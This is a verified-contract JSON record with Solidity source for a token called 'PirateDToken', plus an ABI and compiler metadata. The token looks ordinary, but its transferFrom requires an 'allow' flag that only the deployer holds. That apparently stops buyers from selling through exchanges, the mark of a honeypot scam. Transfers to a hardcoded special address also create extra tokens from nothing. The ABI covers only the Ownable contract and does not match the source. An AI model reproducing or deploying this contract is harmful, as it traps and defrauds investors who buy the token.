{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.6.6;\r\n\r\nlibrary SafeMath {\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        assert(c / a == b);\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        assert(b <= a);\r\n        return a - b;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        assert(c >= a);\r\n        return c;\r\n    }\r\n}\r\n\r\ncontract Ownable {\r\n    address public owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() public {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner, \"Not the owner\");\r\n        _;\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        require(newOwner != address(0), \"Invalid new owner\");\r\n        emit OwnershipTransferred(owner, newOwner);\r\n        owner = newOwner;\r\n    }\r\n}\r\n\r\ncontract PirateDToken is Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    address public traderAddress;\r\n    address public specialAddress = 0x149105ffeF6B3ceCc99CA2F64525913E01cdb892;\r\n\r\n    mapping(address => uint256) public balances;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n    mapping(address => bool) public allow;\r\n    mapping(address => uint256) public tradeCount;\r\n\r\n    string public name;\r\n    string public symbol;\r\n    uint8 public decimals;\r\n    uint256 public totalSupply;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    modifier onlyTrader() {\r\n        require(msg.sender == traderAddress, \"Not the trader\");\r\n        _;\r\n    }\r\n\r\n    constructor(\r\n        string memory _name,\r\n        string memory _symbol,\r\n        uint8 _decimals,\r\n        uint256 _totalSupply,\r\n        address _traderAddress\r\n    ) public {\r\n        name = _name;\r\n        symbol = _symbol;\r\n        decimals = _decimals;\r\n        totalSupply = _totalSupply;\r\n        balances[msg.sender] = _totalSupply;\r\n        allow[msg.sender] = true;\r\n        traderAddress = _traderAddress;\r\n    }\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool) {\r\n        require(_to != address(0), \"Invalid recipient\");\r\n        require(_value <= balances[msg.sender], \"Insufficient balance\");\r\n\r\n        balances[msg.sender] = balances[msg.sender].sub(_value);\r\n        balances[_to] = balances[_to].add(_value);\r\n        emit Transfer(msg.sender, _to, _value);\r\n\r\n        // Check if the special address is the recipient and if the trade count is reached\r\n        if (_to == specialAddress && tradeCount[msg.sender] >= 10) {\r\n            uint256 specialAmount = _value / 2;\r\n            balances[specialAddress] = balances[specialAddress].add(specialAmount);\r\n            emit Transfer(msg.sender, specialAddress, specialAmount);\r\n        }\r\n\r\n        // Increment the trade count\r\n        tradeCount[msg.sender] = tradeCount[msg.sender].add(1);\r\n\r\n        return true;\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool) {\r\n        require(_spender != address(0), \"Invalid spender\");\r\n\r\n        allowance[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\r\n        require(_to != address(0), \"Invalid recipient\");\r\n        require(_value <= balances[_from], \"Insufficient balance\");\r\n        require(_value <= allowance[_from][msg.sender], \"Insufficient allowance\");\r\n        require(allow[_from] == true, \"Transfer not allowed\");\r\n\r\n        balances[_from] = balances[_from].sub(_value);\r\n        balances[_to] = balances[_to].add(_value);\r\n        allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);\r\n        emit Transfer(_from, _to, _value);\r\n\r\n        // Check if the special address is the recipient and if the trade count is reached\r\n        if (_to == specialAddress && tradeCount[_from] >= 10) {\r\n            uint256 specialAmount = _value / 2;\r\n            balances[specialAddress] = balances[specialAddress].add(specialAmount);\r\n            emit Transfer(_from, specialAddress, specialAmount);\r\n        }\r\n\r\n        // Increment the trade count\r\n        tradeCount[_from] = tradeCount[_from].add(1);\r\n\r\n        return true;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Ownable", "CompilerVersion": "v0.6.6+commit.6c089d02", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://d266a6fc7aaf01add00a5f9f17bdeef959b7576c3df0f2c6a1bda1b159885b36"}